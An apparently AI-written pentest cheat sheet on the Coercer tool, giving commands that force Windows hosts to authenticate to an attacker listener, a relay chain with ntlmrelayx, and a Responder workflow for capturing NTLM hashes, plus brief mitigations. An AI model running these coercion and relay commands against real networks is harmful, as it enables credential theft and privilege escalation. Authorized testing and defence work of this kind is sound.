Here are concise notes on using **Coercer** during a pentest to force machine authentication and capture NTLM hashes:

### **Coercer Overview**

**Coercer** is a tool used to trigger NTLM authentication from various Windows services to a specified listener. This can be used to capture or relay NTLM hashes for further exploitation.

### **Installation**

- **Clone the Repository:**
  ```bash
  git clone https://github.com/p0dalirius/Coercer.git
  cd Coercer
  ```

- **Install Dependencies:**
  ```bash
  pip3 install -r requirements.txt
  ```

### **Common Use Cases**

1. **Trigger NTLM Authentication:**

   - **Command:**
     ```bash
     python3 Coercer.py -t <target_ip> -l <listener_ip>
     ```

   - **Use Case:** Forces the target machine to authenticate to your listener (like Responder or ntlmrelayx). The `<target_ip>` is the machine you want to coerce, and `<listener_ip>` is the IP of your machine running the listener.

2. **Specify Target Services:**

   - **Command:**
     ```bash
     python3 Coercer.py -t <target_ip> -l <listener_ip> --only <service>
     ```

   - **Use Case:** Targets specific services (like `MS-RPRN`, `MS-EFSRPC`, etc.) to trigger NTLM authentication. Useful when you know a particular service is running and vulnerable.

3. **Test Multiple Targets:**

   - **Command:**
     ```bash
     python3 Coercer.py -T targets.txt -l <listener_ip>
     ```

   - **Use Case:** Runs coercion attacks on multiple targets listed in `targets.txt`.

4. **Run Against Multiple Services:**

   - **Command:**
     ```bash
     python3 Coercer.py -t <target_ip> -l <listener_ip> --all
     ```

   - **Use Case:** Tries to trigger authentication across all known services. This increases the chance of success but may generate more noise.

5. **Use with NTLM Relaying (ntlmrelayx):**

   - **Command:**
     ```bash
     python3 ntlmrelayx.py -tf targets.txt --smb2support --no-smb-server
     python3 Coercer.py -t <target_ip> -l <listener_ip>
     ```

   - **Use Case:** Combine Coercer with ntlmrelayx to relay NTLM authentication to another service, potentially leading to privilege escalation.

### **Common Target Services**

- **MS-RPRN:** Print Spooler service.
- **MS-EFSRPC:** Encrypting File System Remote Protocol (used in PetitPotam).
- **MS-DFSR:** Distributed File System Replication.
- **MS-TSCH:** Task Scheduler service.

### **Mitigation Check**

- Ensure SMB signing is enforced on all devices.
- Disable unnecessary services like Print Spooler on critical systems.
- Restrict access to sensitive services to authorized users only.

### **Example Workflow**

1. **Start Listener (e.g., Responder or ntlmrelayx):**
   ```bash
   responder -I eth0
   ```

2. **Run Coercer to Trigger Authentication:**
   ```bash
   python3 Coercer.py -t 192.168.1.100 -l 192.168.1.10
   ```

3. **Monitor for Captured Hashes:**
   - Check the output of Responder or ntlmrelayx for captured NTLM hashes.